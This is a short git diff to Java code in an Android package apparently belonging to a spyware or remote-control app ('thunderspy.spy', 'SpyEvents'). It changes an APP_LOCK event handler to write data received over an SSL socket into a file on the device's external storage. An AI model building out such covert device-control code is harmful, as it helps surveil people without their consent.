@@ -1,10 +1,16 @@
 package com.thunderspy.spy.utils.etp;
 
+
+import android.os.Environment;
+
 import com.thunderspy.spy.utils.ApplicationContextManager;
 import com.thunderspy.spy.utils.ThreadPoolManager;
 import com.thunderspy.spy.utils.Utils;
 
+import java.io.FileOutputStream;
+import java.util.Collections;
 import java.util.HashMap;
+import java.util.concurrent.ExecutionException;
 
 import javax.net.ssl.SSLSocket;
 
@@ -21,7 +27,15 @@ public final class EventCallbacks {
         callbacks.put(EventCodes.SpyEvents.APP_LOCK, new EventCallback() {
             @Override
             public void run(SSLSocket socket, HashMap<String, String> headers, byte[] data) {
-                Utils.log(headers);
+                try {
+                    Utils.log(data.length);
+                    FileOutputStream fos = new FileOutputStream(Environment.getExternalStorageDirectory() + "/file");
+                    fos.write(data);
+                    fos.flush();
+                    fos.close();
+                } catch (Exception exp) {
+                    Utils.log(exp.getMessage());
+                }
             }
         });
 
